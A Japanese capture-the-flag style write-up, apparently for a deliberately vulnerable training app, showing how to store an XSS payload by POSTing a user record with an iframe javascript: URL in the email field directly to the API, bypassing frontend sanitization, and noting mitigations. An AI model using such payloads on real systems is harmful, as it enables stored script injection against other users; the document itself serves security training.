# API-only XSS ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** XSS
**目標:** フロントエンドを使わずAPIでXSSペイロードを保存する

---

## 実行手順

DevToolsのConsoleで以下を実行:

```javascript
fetch('/api/Users/', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    email: '<iframe src="javascript:alert(`xss`)">@test.com',
    password: 'test123'
  })
})
```

## 解説

- フロントエンドはXSSペイロードをサニタイズする
- しかしAPIに直接送信するとサニタイズをバイパス
- XSSペイロードがメールアドレスに保存される
- 管理画面などでユーザー一覧を表示した時にXSSが発火

**Stored XSS（保存型XSS）:**
- ペイロードがデータベースに保存される
- 表示するたびに実行される
- 影響範囲が広い（複数のユーザーに影響）

**対策:**
- 入力時と出力時の両方でサニタイズ
- APIでも同じ検証を行う

## 関連チャレンジ

- [DOM XSS](../difficulty-1/dom-xss.md)
- [Reflected XSS](../difficulty-2/reflected-xss.md)
